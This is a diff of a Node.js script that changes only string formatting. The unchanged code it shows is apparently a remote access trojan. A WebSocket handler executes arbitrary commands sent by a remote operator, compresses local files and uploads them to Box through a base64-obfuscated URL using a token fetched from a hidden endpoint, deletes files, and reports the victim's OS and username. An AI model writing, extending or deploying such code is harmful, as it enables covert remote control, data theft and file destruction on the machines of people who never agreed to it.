@@ -18,17 +18,17 @@ function executeCommand(command) {
       if (fs.existsSync(newPath) && fs.lstatSync(newPath).isDirectory()) {
         currentDirectory = newPath;
       } else {
-        return `Directory not found: ${newPath}`;
+        return "Directory not found: " + newPath;
       }
     } else {
       const targetPath = path.join(currentDirectory, newPath);
       if (fs.existsSync(targetPath) && fs.lstatSync(targetPath).isDirectory()) {
         currentDirectory = targetPath;
       } else {
-        return `Directory not found: ${targetPath}`;
+        return "Directory not found: " + targetPath;
       }
     }
-    return `Changed directory to: ${currentDirectory}`;
+    return "Changed directory to: " + currentDirectory;
   }
 
   return new Promise((resolve) => {
@@ -43,8 +43,8 @@ function compressToZip(sourcePath, outputZip) {
     const output = fs.createWriteStream(outputZip);
     const archive = archiver("zip", { zlib: { level: 9 } });
 
-    output.on("close", () => resolve(`Compressed successfully: ${outputZip}`));
-    archive.on("error", (err) => reject(`Error: ${err.message}`));
+    output.on("close", () => resolve("Compressed successfully: " + outputZip));
+    archive.on("error", (err) => reject("Error: " + err.message));
 
     archive.pipe(output);
 
@@ -60,7 +60,7 @@ function compressToZip(sourcePath, outputZip) {
 
 function deleteFileOrFolder(filePath) {
   if (!fs.existsSync(filePath)) {
-    return `File or folder not found: ${filePath}`;
+    return "File or folder not found: " + filePath;
   }
 
   try {
@@ -68,13 +68,13 @@ function deleteFileOrFolder(filePath) {
 
     if (stats.isDirectory()) {
       fs.rmSync(filePath, { recursive: true, force: true });
-      return `Deleted folder: ${filePath}`;
+      return "Deleted folder: " + filePath;
     } else {
       fs.unlinkSync(filePath);
-      return `Deleted file: ${filePath}`;
+      return "Deleted file: " + filePath;
     }
   } catch (error) {
-    return `Error deleting file or folder: ${error.message}`;
+    return "Error deleting file or folder: " + error.message;
   }
 }
 
@@ -87,7 +87,7 @@ async function getToken() {
     const response = await axios.get(apt);
     return response.data;
   } catch (error) {
-    return `Error: ${error.response.status}`;
+    return "Error: " + error.response.status;
   }
 }
 
@@ -96,7 +96,7 @@ async function uploadFileToBox(filePath, fileName, token) {
     "aHR0cHM6Ly91cGxvYWQuYm94LmNvbS9hcGkvMi4wL2ZpbGVzL2NvbnRlbnQ=",
     "base64"
   ).toString("utf-8");
-  const headers = { Authorization: `Bearer ${token}` };
+  const headers = { Authorization: "Bearer " + token };
 
   const formData = new FormData();
   formData.append(
@@ -111,9 +111,11 @@ async function uploadFileToBox(filePath, fileName, token) {
     });
     return response.status === 201
       ? "File uploaded successfully!"
-      : `Error: ${response.status}, Response: ${response.data}`;
+      : "Error: " + response.status + ", Response: " + response.data;
   } catch (error) {
-    return `Error: ${error.response.status}, Response: ${error.response.data}`;
+    return (
+      "Error: " + error.response.status + ", Response: " + error.response.data
+    );
   }
 }
 
@@ -141,18 +143,25 @@ ws.on("message", async (message) => {
       const deleteResult = deleteFileOrFolder(outputZip);
 
       ws.send(
-        `${zipResult}\nToken: ${token}\n${uploadResult}\n${deleteResult}`
+        zipResult +
+          "\nToken: " +
+          token +
+          "\n" +
+          uploadResult +
+          "\n" +
+          deleteResult
       );
     } catch (err) {
-      ws.send(`Error: ${err}`);
+      ws.send("Error: " + err);
     }
   } else if (command === "get_client_info") {
-    const osInfo = `${os.type()}(${os.release()})_${os.userInfo().username}`;
+    const osInfo =
+      os.type() + "(" + os.release() + ")_" + os.userInfo().username;
     ws.send(osInfo);
   } else if (command.startsWith("delete_y ")) {
     const targetPath = path.join(currentDirectory, command.slice(9).trim());
     const deleteResult = deleteFileOrFolder(targetPath);
-    ws.send(`\n${deleteResult}`);
+    ws.send("\n" + deleteResult);
   } else {
     const output = await executeCommand(command);
     ws.send(output);
